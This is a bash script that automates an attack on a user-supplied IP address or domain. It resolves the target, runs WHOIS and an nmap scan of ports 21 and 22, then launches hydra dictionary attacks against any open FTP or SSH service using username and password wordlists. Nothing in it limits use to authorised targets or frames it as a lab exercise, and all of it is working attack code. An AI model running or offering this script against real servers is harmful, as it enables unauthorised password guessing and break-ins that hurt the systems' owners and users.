#!/bin/bash

perform_whois() {
    local ip=$1
    echo "Performing WHOIS Lookup for $ip..."
    whois $ip
}

perform_port_scan() {
    local ip=$1
    echo "Performing Port Scanning for $ip..."
    nmap -Pn -p21,22 $ip
}

perform_ftp_attack() {
    local ip=$1
    if echo "$2" | grep -q "21/tcp open"; then
        echo "Performing FTP Dictionary Attack on $ip..."
        hydra -L usernames.txt -P passwords.txt ftp://$ip -t4 -o hydra_output_ftp.txt
    else
        echo "Port 21 (FTP) is closed on $ip."
    fi
}

perform_ssh_attack() {
    local ip=$1
    if echo "$2" | grep -q "22/tcp open"; then
        echo "Performing SSH Dictionary Attack on $ip..."
        hydra -L usernames.txt -P passwords.txt ssh://$ip -t4 -o hydra_output_ssh.txt
    else
        echo "Port 22 (SSH) is closed on $ip."
    fi
}

read -p "Enter IP address or domain: " target

if [[ $target =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    ip=$target
else
    ip=$(dig +short $target | tail -n1)
    if [ -z "$ip" ]; then
        echo "Failed to resolve IP for $target"
        exit 1
    fi
fi

echo "Target IP: $ip"
perform_whois $ip
port_scan_result=$(perform_port_scan $ip)
echo "$port_scan_result"

perform_ftp_attack $ip "$port_scan_result"
perform_ssh_attack $ip "$port_scan_result"
